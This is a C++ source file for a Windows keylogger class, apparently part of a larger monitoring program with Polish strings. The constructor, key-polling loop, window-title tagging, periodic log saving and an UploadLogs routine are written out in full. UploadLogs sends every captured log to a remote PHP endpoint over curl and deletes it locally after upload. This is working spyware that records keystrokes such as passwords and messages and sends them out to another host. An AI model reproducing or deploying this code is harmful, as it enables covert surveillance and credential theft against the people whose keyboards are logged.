// Filename: class.keylogger.cpp
// Author:   Patryk Po³eæ

#include "engine.h"

////////////////////////////////////////////////////////////////////////////////////////////////// Constructor and destructor
C_Keylogger::C_Keylogger(C_Base *_objBase): objBase(_objBase)
{
	// Public fields
	stateLogged = 1;

	// Private fields
	fileLog     = new C_File;
	fileTempLog = new C_File;

	hashMD5     = new C_Scrambler;

	curl        = new C_Curl;

	stateKey = 0;
	for(int a = 0; a <= sizeof(stateKeyOld); a++) stateKeyOld[a] = 0;
	
	timeActual       = time(0);
	timeIntervalSave = 5;
	timeLastSave     = time(0);

	localTimeActual = *localtime(&timeActual);

	altOff   = "acelnosxzACELNOSXZ";
	altOn    = "¹æê³ñóœŸ¿¥ÆÊ£ÑÓŒ¯";
	shiftOff = "abcdefghijklmnopqrstuvwxyz¹æê³ñóœŸ¿1234567890-=[]\\;',./";
	shiftOn  = "ABCDEFGHIJKLMNOPQRSTUVWXYZ¥ÆÊ£ÑÓŒ¯!@#$%^&*()_+{}|:\"<>?";

	titleActive.clear();
	titleOld.clear();

	bufferString.clear();

	key = 0;
	for(int a = 0; a <= sizeof(bufferChar); a++) bufferChar[a] = 0;
}

C_Keylogger::~C_Keylogger()
{
	delete fileLog;
}

////////////////////////////////////////////////////////////////////////////////////////////////// Public methods
void C_Keylogger::UploadLogs()
{
	DIR *pcdDataLogs;
	pcdDataLogs = opendir(objBase->pcdDataLogs.c_str());
	
	struct dirent *file;

	string
		pcfLog,
		random = hashMD5->Random();

	while(file = readdir(pcdDataLogs)) 
	{
		if(file->d_type == DT_REG)
		{
			pcfLog = objBase->pcdDataLogs + "\\" + string(file->d_name);
			if(!fileTempLog->Open(pcfLog, ios::in)) continue;

			fileTempLog->GetData(bufferString);
			fileTempLog->Close();
			
			bufferStringStream.str("");
			bufferStringStream << "path=" << objBase->psdUsersUserDeviceDataLogs << "/" << file->d_name << "&data=" << curl->Escape(bufferString) << "&random=" << random << "&code=" << hashMD5->Hash(random + "has³o", MD5);

			curl->Request(objBase->psfApiSaveFilePhp, bufferStringStream.str());
			if(curl->GetSourcePage(0, 1) == "1") remove(pcfLog.c_str());
		}
	}

	closedir(pcdDataLogs);

	bufferStringStream.str("");
	bufferString.clear();

	delete curl;
	delete hashMD5;
	delete fileTempLog;
}

void C_Keylogger::InitLog()
{
	bufferStringStream.str("");
	bufferStringStream << objBase->pcdDataLogs << "\\log-" << timeActual << ".txt";
	fileLog->Open(bufferStringStream.str(), ios::app);

	time(&timeActual);
	localTimeActual = *localtime(&timeActual);
	strftime(bufferChar, sizeof(bufferChar), "%X %x", &localTimeActual);
	fileLog->file << "*** Data rozpoczêcia zapisu klawiatury - " << bufferChar << " ***";
	fileLog->Save();
}

void C_Keylogger::Logged()
{	
	while(stateLogged)
	{
		key = 0;

		for(int a = 8; a < 256; a++)
		{
			stateKey = HIBYTE(GetAsyncKeyState(a));
		
			if(stateKey && !stateKeyOld[a])
			{
					 if(a == VK_BACK)     AddKeyToLog("{BACKSPACE}"   );
				else if(a == VK_RETURN)   AddKeyToLog("\n{ENTER}"     );
				else if(a == VK_TAB)      AddKeyToLog("{TAB}"         );
				else if(a == VK_PAUSE)    AddKeyToLog("{PAUSE}"       );
				else if(a == VK_ESCAPE)   AddKeyToLog("{ESC}"         );
				else if(a == VK_PRINT)    AddKeyToLog("{PRINT}"       );
				else if(a == VK_SNAPSHOT) AddKeyToLog("{PRINT SCREEN}");
				else if(a == VK_INSERT)   AddKeyToLog("{INSERT}"      );
				else if(a == VK_DELETE)   AddKeyToLog("{DEL}"         );
				else
				{
					key = tolower(MapVirtualKey(a, 2));

					if(GetKeyState(VK_CAPITAL)) key = toupper(key);

					if(HIWORD(GetKeyState(VK_MENU)))
					{
						for(unsigned short a = 0; a < altOff.size(); a++)
						{
							if(key == altOff[a])
							{
								key = altOn[a];
								break;
							}
						}
					}
			
					if(HIWORD(GetKeyState(VK_SHIFT)))
					{
						for(unsigned short a = 0; a < shiftOff.size(); a++)
						{
							if(key == shiftOff[a])
							{
								key = shiftOn[a];
								break;
							}
							else if(key == shiftOn[a])
							{
								key = shiftOff[a];
								break;
							}
						}
					}
				}

				if(key) AddKeyToLog(string(1, key));
			}

			stateKeyOld[a] = stateKey;
		}

		SaveLog();

		Sleep(10);
	}

	_endthread();
}

////////////////////////////////////////////////////////////////////////////////////////////////// Private methods
void C_Keylogger::AddKeyToLog(string _key)
{
	GetWindowText(GetForegroundWindow(), bufferChar, 512);
	titleActive = string(bufferChar);

	if(titleActive == "") titleActive = "Pulpit";

	if(titleActive == titleOld) fileLog->file << _key;
	else
	{
		titleOld = titleActive;

		time(&timeActual);
		localTimeActual = *localtime(&timeActual);
		strftime(bufferChar, sizeof(bufferChar), "%X %x", &localTimeActual);

		fileLog->file << "\n\n[" << bufferChar << " - " << titleActive << "]\n" << _key;
	}
}

void C_Keylogger::SaveLog()
{	
	if((time(0) - timeLastSave) >= timeIntervalSave)
	{
		fileLog->Save();
		timeLastSave = time(0);
	}
}